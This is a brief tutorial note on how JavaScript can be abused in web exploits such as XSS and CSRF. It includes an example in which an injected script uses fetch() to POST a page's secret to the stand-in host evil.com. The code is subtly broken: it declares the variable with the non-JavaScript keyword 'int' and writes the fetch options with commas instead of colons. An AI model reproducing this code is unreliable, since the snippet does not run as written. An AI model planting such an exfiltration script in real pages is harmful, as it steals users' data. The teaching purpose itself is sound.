> [!motivation] Understanding JavaScript's Role in Web Exploits
> 
> JavaScript, a client-side programming language, is a **powerful tool for creating interactive web experiences**. However, its versatility and browser support also make it a **prime target for attackers seeking to exploit web applications**. 
>
> By understanding how JavaScript can be misused, developers can better protect their applications from common vulnerabilities like **Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)**. 

> [!idea] JavaScript: A Double-Edged Sword
> 
> JavaScript is a **scripting language that runs in the user's web browser**, allowing for dynamic and interactive web pages. It can **manipulate the DOM**, **make HTTP requests**, and **access cookies and local storage**.
>
> While these capabilities enable rich web experiences, they can also be abused by attackers. Malicious JavaScript code injected into a web page can **steal sensitive data**, **hijack user sessions**, or perform unauthorized actions on behalf of the user.

> [!example] A Simple JavaScript Exploit

>```js
><script> int secret=42; </script>
>...
><script> fetch('https://evil.com/receive',  {method, 'POST', body: secret})</script>
>```

>Suppose the server returns some HTML with a secret JavaScript variable. If the attacker could somehow add the second script, the browser will send a POST request to the attacker's server with the secret!
